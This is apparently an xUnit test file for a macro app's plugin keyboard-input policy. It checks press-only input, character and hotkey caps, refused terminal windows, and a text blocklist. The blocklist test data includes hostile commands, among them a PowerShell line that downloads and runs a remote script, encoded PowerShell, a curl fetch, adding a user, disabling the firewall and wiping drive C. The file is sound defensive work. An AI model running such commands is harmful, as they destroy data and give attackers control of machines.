using System.Net;
using System.Text.Json.Nodes;
using MacroGrid.Core.Diagnostics;
using MacroGrid.Core.Plugins;
using MacroGrid.Core.Plugins.Js;
using MacroGrid.Core.Sessions;
using MacroGrid.Core.Variables;
using MacroGrid.Plugin.Abstractions;
using Microsoft.Extensions.Logging;

namespace MacroGrid.Tests;

/// <summary>The limits on a JavaScript plugin's <c>input</c> permission: only while handling a real press, few keys per
/// press, no dangerous combinations, no typing into terminals or Macro Grid itself, a text blocklist, and a settings cap.</summary>
public sealed class JsInputRulesTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "ms-jsinput-" + Guid.NewGuid().ToString("N"));
    private readonly VariableStore _variables = new();
    private readonly List<JsPlugin> _plugins = [];
    private readonly List<string> _faults = [];
    private readonly RecordingInput _input = new();
    private readonly FakeWindows _windows = new(new ForegroundWindow("notepad.exe", "Untitled", "Notepad"));
    private readonly CapturingLogger _log = new();
    private readonly ProblemList _problems = new();
    private bool _elevated;

    public JsInputRulesTests() => Directory.CreateDirectory(_dir);

    public void Dispose()
    {
        foreach (var plugin in _plugins) plugin.Dispose();
        try { Directory.Delete(_dir, recursive: true); } catch (IOException) { } catch (UnauthorizedAccessException) { }
    }

    private sealed class RecordingInput : IInputService
    {
        public List<string> Typed { get; } = [];
        public List<string> Combos { get; } = [];
        public void SendKeyCombo(KeyCombo combo) => Combos.Add(combo.ToString());
        public void TypeText(string text) => Typed.Add(text);
    }

    private sealed class FakeWindows(ForegroundWindow? foreground) : IActiveWindowSource
    {
        public ForegroundWindow? Foreground { get; set; } = foreground;
        public event Action<ForegroundWindow>? ForegroundChanged { add { } remove { } }
        public bool HasVisibleWindow(string processName) => false;
        public void Start() { }
        public IReadOnlyList<ForegroundWindow> ListVisibleWindows() => [];
        public ForegroundWindow? GetForeground() => Foreground;
    }

    private sealed class CapturingLogger : ILogger
    {
        public List<string> Messages { get; } = [];
        public IDisposable? BeginScope<TState>(TState state) where TState : notnull => null;
        public bool IsEnabled(LogLevel logLevel) => true;
        public void Log<TState>(LogLevel logLevel, EventId eventId, TState state, Exception? exception, Func<TState, Exception?, string> formatter) =>
            Messages.Add(formatter(state, exception));
    }

    private static readonly JsPluginLimits Roomy = JsPluginLimits.Default with { CallTimeout = TimeSpan.FromSeconds(5) };

    private (JsPlugin Plugin, PluginHostCollector Host) Start(string script, string[]? permissions = null, JsPluginLimits? limits = null)
    {
        var path = Path.Combine(_dir, "index.js");
        File.WriteAllText(path, script);
        var manifest = new PluginManifest { Id = "t", Name = "T", Version = "1.0.0", MinMacroGrid = "1.0.0", Entry = "index.js", Kind = PluginKind.Js };
        var plugin = new JsPlugin(manifest, path, new JsPermissions(permissions ?? ["variables", "actions", "input"]),
            _variables, _input, _log, _faults.Add, limits ?? Roomy, _windows, () => _elevated, _problems);
        _plugins.Add(plugin);
        var host = new PluginHostCollector("0.1.0", _dir, "t", new PluginStatusRegistry(), _log);
        plugin.Initialize(host);
        return (plugin, host);
    }

    private static Task Press(PluginHostCollector host, string type = "t.go") =>
        host.Actions.Single(a => a.Type == type).ExecuteAsync(new ActionContext("d", "p", "w", null!, null), new JsonObject(), CancellationToken.None);

    /// <summary>An action whose body is the given statements; a thrown error is stored in <c>t.err</c>.</summary>
    private (JsPlugin Plugin, PluginHostCollector Host) StartAction(string body, string[]? permissions = null, JsPluginLimits? limits = null) =>
        Start($"host.registerAction({{ type: 't.go', name: 'Go', run: async () => {{ try {{ {body} }} catch (e) {{ host.variables.set('t.err', e.message); }} }} }});", permissions, limits);

    private string? Error => _variables.Get("t.err") as string;

    private static async Task WaitAsync(Func<bool> condition)
    {
        for (var i = 0; i < 200 && !condition(); i++) await Task.Delay(25);
        Assert.True(condition(), "The condition was not met in time.");
    }

    // ---- the Error List ----

    [Fact]
    public async Task A_refused_key_press_is_listed_once_with_the_reason_and_a_count()
    {
        _windows.Foreground = new ForegroundWindow("cmd.exe", "title", "ConsoleWindowClass");
        var (_, host) = StartAction("host.input.type('x');");

        for (var i = 0; i < 3; i++) await Press(host);

        var problem = Assert.Single(_problems.Snapshot());
        Assert.Equal("t", problem.Source);
        Assert.Equal("T", problem.SourceName);
        Assert.Equal(ProblemCodes.InputRefused, problem.Code);
        Assert.Equal(3, problem.Count);
        Assert.Contains("terminal", problem.Message);
    }

    [Fact]
    public async Task A_refusal_the_script_does_not_catch_is_not_listed_twice()
    {
        _windows.Foreground = new ForegroundWindow("cmd.exe", "title", "ConsoleWindowClass");
        var (_, host) = Start("host.registerAction({ type: 't.go', name: 'Go', run: () => { host.input.type('x'); } });");

        try { await Press(host); } catch (Exception) { /* the failed action is expected */ }

        Assert.Equal(ProblemCodes.InputRefused, Assert.Single(_problems.Snapshot()).Code);
    }

    [Fact]
    public async Task A_blocked_command_is_listed_as_an_error()
    {
        var (_, host) = StartAction("host.input.type('powershell -enc AAAA');");

        await Press(host);

        var problem = Assert.Single(_problems.Snapshot(), p => p.Code == ProblemCodes.InputBlocked);
        Assert.Equal(ProblemSeverity.Error, problem.Severity);
        Assert.DoesNotContain("powershell", problem.Message);
    }

    // ---- only while handling a press ----

    [Fact]
    public void Input_at_start_up_is_refused()
    {
        Start("try { host.input.type('x'); } catch (e) { host.variables.set('t.err', e.message); }");

        Assert.Equal("Keyboard input is only allowed while handling a button press.", Error);
        Assert.Empty(_input.Typed);
    }

    [Fact]
    public async Task Input_from_a_timer_is_refused()
    {
        Start("host.after(100, () => { try { host.input.type('x'); } catch (e) { host.variables.set('t.err', e.message); } });");

        await WaitAsync(() => Error is not null);
        Assert.Contains("only allowed while handling a button press", Error);
        Assert.Empty(_input.Typed);
    }

    [Fact]
    public async Task Input_from_a_request_that_was_not_started_by_a_press_is_refused()
    {
        var (listener, port) = Server(0);
        using var _ = listener;
        Start($"host.http.getAsync('http://localhost:{port}/x').then(() => host.input.type('x')).catch(e => host.variables.set('t.err', e.message));",
            ["variables", "input", $"http:localhost:{port}"]);

        await WaitAsync(() => Error is not null);
        Assert.Contains("only allowed while handling a button press", Error);
        Assert.Empty(_input.Typed);
    }

    [Fact]
    public async Task Input_inside_a_press_works()
    {
        var (_, host) = StartAction("host.input.type('hello'); host.input.hotkey('ctrl+c');");

        await Press(host);

        Assert.Null(Error);
        Assert.Equal(["hello"], _input.Typed);
        Assert.Single(_input.Combos);
    }

    [Fact]
    public async Task Input_after_an_awaited_request_still_belongs_to_the_press()
    {
        var (listener, port) = Server(0);
        using var _ = listener;
        var (_, host) = StartAction($"await host.http.getAsync('http://localhost:{port}/x'); host.input.type('done');",
            ["variables", "actions", "input", $"http:localhost:{port}"]);

        await Press(host);

        await WaitAsync(() => _input.Typed.Count == 1);
        Assert.Null(Error);
    }

    [Fact]
    public async Task The_press_window_closes_after_its_time()
    {
        var (listener, port) = Server(700);
        using var _ = listener;
        var (_, host) = StartAction($"await host.http.getAsync('http://localhost:{port}/x'); host.input.type('late');",
            ["variables", "actions", "input", $"http:localhost:{port}"], Roomy with { PressWindow = TimeSpan.FromMilliseconds(250) });

        await Press(host);

        await WaitAsync(() => Error is not null);
        Assert.Contains("only allowed while handling a button press", Error);
        Assert.Empty(_input.Typed);
    }

    [Fact]
    public async Task The_press_window_closes_when_the_action_has_settled()
    {
        // The action ends at once but leaves a callback behind; when it runs the press is over.
        var (_, host) = StartAction("host.after(100, () => { try { host.input.type('x'); } catch (e) { host.variables.set('t.err', e.message); } });");

        await Press(host);

        await WaitAsync(() => Error is not null);
        Assert.Empty(_input.Typed);
    }

    // ---- amounts ----

    [Fact]
    public async Task One_type_call_takes_at_most_200_characters()
    {
        var (_, host) = StartAction("host.input.type('a'.repeat(201));");

        await Press(host);

        Assert.Contains("at most 200 characters", Error);
        Assert.Empty(_input.Typed);
    }

    [Fact]
    public async Task One_press_types_at_most_200_characters_in_total()
    {
        var (_, host) = StartAction("host.input.type('a'.repeat(150)); host.input.type('b'.repeat(51));");

        await Press(host);

        Assert.Contains("At most 200 characters", Error);
        Assert.Single(_input.Typed);
    }

    [Fact]
    public async Task One_press_sends_at_most_10_key_combinations()
    {
        var (_, host) = StartAction("for (let i = 0; i < 11; i++) host.input.hotkey('ctrl+c');");

        await Press(host);

        Assert.Contains("At most 10 key combinations", Error);
        Assert.Equal(10, _input.Combos.Count);
    }

    [Fact]
    public async Task The_amounts_start_again_with_the_next_press()
    {
        var (_, host) = StartAction("host.input.type('a'.repeat(200));");

        await Press(host);
        await Press(host);

        Assert.Null(Error);
        Assert.Equal(2, _input.Typed.Count);
    }

    // ---- refused key combinations ----

    [Theory]
    [InlineData("win+r")]
    [InlineData("win")]
    [InlineData("ctrl+win+d")]
    [InlineData("ctrl+shift+esc")]
    [InlineData("ctrl+esc")]
    [InlineData("ctrl+alt+delete")]
    public async Task Dangerous_key_combinations_are_refused(string combo)
    {
        var (_, host) = StartAction($"host.input.hotkey('{combo}');");

        await Press(host);

        Assert.NotNull(Error);
        Assert.Empty(_input.Combos);
    }

    [Fact]
    public async Task An_ordinary_combination_is_allowed()
    {
        var (_, host) = StartAction("host.input.hotkey('ctrl+shift+s');");

        await Press(host);

        Assert.Null(Error);
        Assert.Single(_input.Combos);
    }

    // ---- refused target windows ----

    [Theory]
    [InlineData("cmd.exe", "")]
    [InlineData("powershell.exe", "")]
    [InlineData("pwsh.exe", "")]
    [InlineData("WindowsTerminal.exe", "CASCADIA_HOSTING_WINDOW_CLASS")]
    [InlineData("wscript.exe", "")]
    [InlineData("mshta.exe", "")]
    [InlineData("regedit.exe", "")]
    [InlineData("mmc.exe", "")]
    [InlineData("taskmgr.exe", "")]
    [InlineData("explorer.exe", "#32770")]
    [InlineData("MacroGrid.exe", "")]
    [InlineData("python.exe", "ConsoleWindowClass")]
    public async Task Typing_into_a_refused_window_is_refused(string process, string windowClass)
    {
        _windows.Foreground = new ForegroundWindow(process, "title", windowClass);
        var (_, host) = StartAction("host.input.type('x');");

        await Press(host);

        Assert.NotNull(Error);
        Assert.Empty(_input.Typed);
    }

    [Fact]
    public async Task An_unidentified_window_in_front_refuses_input()
    {
        _windows.Foreground = null;
        var (_, host) = StartAction("host.input.type('x');");

        await Press(host);

        Assert.Contains("could not be identified", Error);
    }

    [Fact]
    public async Task An_ordinary_program_in_front_receives_input()
    {
        var (_, host) = StartAction("host.input.type('hello');");

        await Press(host);

        Assert.Equal(["hello"], _input.Typed);
    }

    [Fact]
    public async Task Input_is_refused_entirely_when_the_server_runs_as_administrator()
    {
        _elevated = true;
        var (_, host) = StartAction("host.input.type('x');");

        await Press(host);

        Assert.Contains("administrator", Error);
        Assert.Empty(_input.Typed);
    }

    // ---- the text blocklist ----

    [Theory]
    [InlineData("powershell -nop -w hidden")]
    [InlineData("cmd /c calc")]
    [InlineData("p^o^w^e^r^s^h^e^l^l")]
    [InlineData("IEX (iwr http://x.test/a.ps1)")]
    [InlineData("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")]
    [InlineData("reg add HKCU\\Software\\Run /v x")]
    [InlineData("sc create svc binPath= c:\\x.exe")]
    [InlineData("schtasks /create /tn x")]
    [InlineData("net user hacker pw /add")]
    [InlineData("netsh advfirewall set allprofiles state off")]
    [InlineData("format c:")]
    [InlineData("rd /s /q c:\\")]
    [InlineData("curl https://x.test/a.sh")]
    public async Task Text_that_looks_like_a_harmful_command_is_refused_and_the_plugin_is_switched_off(string text)
    {
        var (_, host) = StartAction($"host.input.type({System.Text.Json.JsonSerializer.Serialize(text)});");

        await Press(host);

        Assert.Equal("This text is not allowed.", Error);
        Assert.Empty(_input.Typed);
        Assert.Contains(_faults, f => f.Contains("blocked command"));
        Assert.Contains(_log.Messages, m => m.StartsWith("Security:") && m.Contains("rule"));
        Assert.DoesNotContain(_log.Messages, m => m.Contains(text, StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task A_command_split_over_two_calls_in_one_press_is_still_refused()
    {
        var (_, host) = StartAction("host.input.type('power'); host.input.type('shell -nop');");

        await Press(host);

        Assert.Equal("This text is not allowed.", Error);
        Assert.Equal(["power"], _input.Typed);
    }

    [Theory]
    [InlineData("gg wp!")]
    [InlineData("Hello, welcome to the stream. Follow for more!")]
    [InlineData("/me waves")]
    [InlineData("!discord")]
    public async Task Ordinary_text_is_not_refused(string text)
    {
        var (_, host) = StartAction($"host.input.type({System.Text.Json.JsonSerializer.Serialize(text)});");

        await Press(host);

        Assert.Null(Error);
        Assert.Equal([text], _input.Typed);
        Assert.Empty(_faults);
    }

    [Fact]
    public async Task After_a_blocked_command_the_plugin_can_no_longer_use_the_keyboard()
    {
        var (_, host) = StartAction("try { host.input.type('cmd /c x'); } catch (e) {} host.input.type('hello');");

        await Press(host);

        Assert.Contains("switched off", Error);
        Assert.Empty(_input.Typed);
    }

    // ---- visible use ----

    [Fact]
    public async Task A_press_that_used_the_keyboard_is_counted_once_and_logged_without_the_text()
    {
        var (plugin, host) = StartAction("host.input.type('secret words'); host.input.hotkey('enter');");

        Assert.Equal(0, plugin.KeyboardUsesToday);
        await Press(host);

        Assert.Equal(1, plugin.KeyboardUsesToday);
        Assert.Contains(_log.Messages, m => m.Contains("sent") && m.Contains("key(s)"));
        Assert.DoesNotContain(_log.Messages, m => m.Contains("secret words"));
    }

    [Fact]
    public async Task A_press_that_did_not_use_the_keyboard_is_not_counted()
    {
        var (plugin, host) = StartAction("host.variables.set('t.x', 1);");

        await Press(host);

        Assert.Equal(0, plugin.KeyboardUsesToday);
    }

    // ---- the policy itself ----

    [Fact]
    public void Normalize_removes_escape_characters_and_quotes_and_collapses_spaces()
    {
        Assert.Equal("powershell -nop", JsInputPolicy.Normalize("P^o\"w`e'rShell   -NOP"));
    }

    // ---- settings cap ----

    [Fact]
    public void A_settings_page_refuses_to_save_more_than_64_KB()
    {
        var page = new JsSettingsPage(_dir, [new SettingField("note", "Note", SettingFieldKind.Text)]);

        page.Save(new JsonObject { ["note"] = new string('a', 1000) });
        var ex = Assert.Throws<InvalidOperationException>(() => page.Save(new JsonObject { ["note"] = new string('a', 70 * 1024) }));

        Assert.Contains("64 KB", ex.Message);
        Assert.Equal(1000, page.Load()["note"]!.GetValue<string>().Length); // the earlier save is untouched
    }

    private static (HttpListener Listener, int Port) Server(int delayMs)
    {
        HttpListener listener;
        int port;
        while (true)
        {
            // A failed Start closes the listener, so every attempt gets a new one.
            port = Random.Shared.Next(20000, 60000);
            listener = new HttpListener();
            listener.Prefixes.Add($"http://localhost:{port}/");
            try { listener.Start(); break; } catch (HttpListenerException) { }
        }
        _ = Task.Run(async () =>
        {
            while (listener.IsListening)
            {
                HttpListenerContext context;
                try { context = await listener.GetContextAsync(); } catch (Exception) { return; }
                _ = Task.Run(async () =>
                {
                    await Task.Delay(delayMs);
                    var bytes = "hello"u8.ToArray();
                    try { context.Response.OutputStream.Write(bytes); context.Response.Close(); } catch (Exception) { }
                });
            }
        });
        return (listener, port);
    }
}
